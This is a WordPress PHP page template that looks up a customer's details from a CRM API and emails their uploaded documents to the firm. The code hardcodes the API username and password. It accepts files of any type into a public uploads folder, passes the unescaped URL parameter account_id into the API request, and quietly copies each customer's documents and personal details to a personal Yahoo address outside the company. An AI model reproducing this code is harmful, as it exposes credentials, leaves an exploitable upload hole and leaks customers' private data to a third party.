<?php

/**
 *
 * Template Name: Customer Document Upload
 *
 */
get_header('nonav');
global $wpdb;
$account_id = isset($_GET['account_id']) ? $_GET['account_id'] : "0";
if ($account_id == "0") {
    header('Location:' . home_url());
    exit();
} else {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://service.leads360.com/ClientService.asmx/GetLead");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "username=VelocifyAPI@velocify.com&password=@Inte11ecTpo&leadId=" . $account_id);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    if (curl_error($ch)) {
        header('Location:' . home_url());
        exit();
    } else {
        $first_name = $last_name = $email = $phone = $mobile = $address = $city = $state = $zip = "";
        $xmlData = new SimpleXMLElement($server_output);
        $leadDataXml = json_encode($xmlData);
        $leadDataArr1 = json_decode($leadDataXml, true);
        $leadDataArr = $leadDataArr1['Lead']['Fields']['Field'];
        if (count($leadDataArr) > 0) {
            foreach ($leadDataArr as $leadDataIndex => $leadDataVal) {
                if ($leadDataVal['@attributes']['FieldId'] == "4") {
                    $first_name = $leadDataVal['@attributes']['Value'];
                }
                if ($leadDataVal['@attributes']['FieldId'] == "5") {
                    $last_name = $leadDataVal['@attributes']['Value'];
                }
                if ($leadDataVal['@attributes']['FieldId'] == "3") {
                    $email = $leadDataVal['@attributes']['Value'];
                }
                if ($leadDataVal['@attributes']['FieldId'] == "11") {
                    $phone = $leadDataVal['@attributes']['Value'];
                }
                if ($leadDataVal['@attributes']['FieldId'] == "12") {
                    $mobile = $leadDataVal['@attributes']['Value'];
                }
                if ($leadDataVal['@attributes']['FieldId'] == "6") {
                    $address = $leadDataVal['@attributes']['Value'];
                }
                if ($leadDataVal['@attributes']['FieldId'] == "7") {
                    $city = $leadDataVal['@attributes']['Value'];
                }
                if ($leadDataVal['@attributes']['FieldId'] == "230") {
                    $state = $leadDataVal['@attributes']['Value'];
                }
                if ($leadDataVal['@attributes']['FieldId'] == "160") {
                    $zip = $leadDataVal['@attributes']['Value'];
                }
            }
        } else {
            header('Location:' . home_url());
            exit();
        }
    }
    curl_close($ch);
}
if (isset($_REQUEST['submit_btn'])) {
    $errors = [];
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        if (empty($_FILES['file_upload']['name'])) {
            $errors['file_upload'] = "Please upload file";
        }
        $msg_success = "false";
        if (0 === count($errors)) {
            $target_dir = 'wp-content/uploads/customerdoc/';
            $attach_name = time() . basename($_FILES["file_upload"]["name"]);
            $target_file = $target_dir . $attach_name;
            if (move_uploaded_file($_FILES["file_upload"]["tmp_name"], $target_file)) {
                $message = "Hello,<br><br>";
                $message .= "Please find attachment as submitted document.'<br><br>";
                $message .= "Account Id: " . $account_id . '<br>';
                $message .= "First Name: " . $first_name . '<br>';
                $message .= "Last Name: " . $last_name . '<br>';
                $message .= "Email: " . $email . '<br>';
                $message .= "Phone: " . $phone . '<br>';
                $message .= "Mobile: " . $mobile . '<br><br>Thank You';
                $subject = __("Document Submission");
                $headers = [];

                add_filter('wp_mail_content_type', function ($content_type) {
                    return 'text/html';
                });

                $admin_email = "customerrelations@birchgold.com"; //Customerrelations@birchgold.com
                $headers[] = 'From: ' . get_bloginfo('name') . ' <' . $admin_email . '>' . "\r\n";
                $mail_attachment = [WP_CONTENT_DIR . '/uploads/customerdoc/' . $attach_name];
                wp_mail($admin_email, $subject, $message, $headers, $mail_attachment);
                wp_mail($email, $subject, $message, $headers, $mail_attachment);
                wp_mail("saeedurrehman15@yahoo.com", $subject, $message, $headers, $mail_attachment);
                //wp_mail( $email, $subject, $message, $headers,$mail_attachment);
                // Reset content-type to avoid conflicts -- http://core.trac.wordpress.org/ticket/23578
                remove_filter('wp_mail_content_type', 'set_html_content_type');
                if (!is_wp_error($errors)) {
                    $msg_success = "true";
                    unlink('wp-content/uploads/customerdoc/' . $attach_name);
                    //unset($_POST);
                }
            } else {
                $errors['file_upload'] = "failed to upload file.";
            }
        }
    }
}
?>
<style>
    .wpcf711 input[type="text"],
    .wpcf711 input[type="email"] {

        font-family: Arial, Helvetica, Verdana, sans-serif;
        font-size: 12px;
        position: relative;
        outline: none;
        padding: 14px 8px;
        -moz-border-radius: 4px;
        -webkit-border-radius: 4px;
        border-radius: 4px;
        color: #8C8C8C;
        border: 1px solid #eee;
        background: #fff;
        -moz-box-box-shadow: inset 0 0 0 1px #fff, 1px 2px 0px #eee;
        -webkit-box-shadow: inset 0 0 0 1px #fff, 1px 2px 0px #eee;
        box-shadow: inset 0 0 0 1px #fff, 1px 2px 0px #eee;
        width: 100%;

    }

    button,
    input {

        line-height: normal;

    }
</style>
<div id="blogHeaderSidebar" class="row clearfix">
    <?php dynamic_sidebar('main header'); ?>
</div>
<section class="content_block_background">

    <section id="row-<?php the_ID(); ?>" class="content_block clearfix" style="padding-top: 17px;">

        <section id="post-<?php the_ID(); ?>" <?php post_class("content " . $rt_sidebar_location[0]); ?>>

            <div class="row clearfix">
                <div class="custom-page_title"><?= get_the_title(); ?></div>
                <div class="row clearfix">
                    <div class="box one clearfix first widget widget_text">
                        <div class="textwidget"></div>
                    </div>
                </div>
            </div>
            <div class="row clearfix">
                <hr class="style-six fadeInDown animated" data-rt-animation-group="single" data-rt-animation-type="fadeInDown" data-rt-animate="animate" style="animation-delay: 0s;">
            </div>

            <div class="row clearfix">


                <?php do_action("get_info_bar", apply_filters('get_info_bar_pages', ["called_for" => "inside_content"])); ?>




                <section class="content right ">
                    <div class="row clearfix">
                        <section class="text_box fadeIn animated" data-rt-animate="animate" data-rt-animation-type="fadeIn" data-rt-animation-group="single" style="animation-delay: 0s;">
                            <div role="form" class="wpcf711">
                                <div class="screen-reader-response">
                                    <?php
                                    if (count($errors) > 0) {
                                        foreach ($errors as $error_key => $error_desc) {
                                            echo '<div class="alert alert-danger" style="color:red;"><strong>Error! </strong>' . $error_desc . '</div>';
                                        }
                                    }
                                    if ($msg_success == "true") {
                                        echo '<div class="alert alert-success" style="color:#E0AF1D;">Record has been submitted successfully. Thank You</div>';
                                    }
                                    ?>
                                </div>
                                <form action="" method="post" id="customer_form" name="customer_form" enctype="multipart/form-data">
                                    <div class="contact-us_form">
                                        <div class="contact-us_form_row clearfix">
                                            <div class="contact-us_form_col">
                                                File*:<br><input type="file" name="file_upload" id="file_upload" value="" required>
                                            </div>
                                        </div>
                                        <br>
                                        <div class="contact-us_form_row clearfix">
                                            <input type="submit" value="Submit" id="submit_btn" name="submit_btn" class="">
                                        </div>
                                    </div>
                                </form>
                            </div>
                            <p></p>
                        </section>
                    </div>
                </section>


                <?php get_template_part('content', 'page'); ?>

                <?php if (comments_open() && get_option(RT_THEMESLUG . "_allow_page_comments")) : ?>
                    <div class='entry commententry'>
                        <?php comments_template(); ?>
                    </div>
                <?php endif; ?>
            </div>
        </section><!-- / end section .content -->
        <?php //get_sidebar();
        ?>
    </section>
</section>
<div class="footer-block" id="blogFooterSidebar">
    <?php dynamic_sidebar('footer nonav'); ?>
</div>
<?php get_footer('nonav'); ?>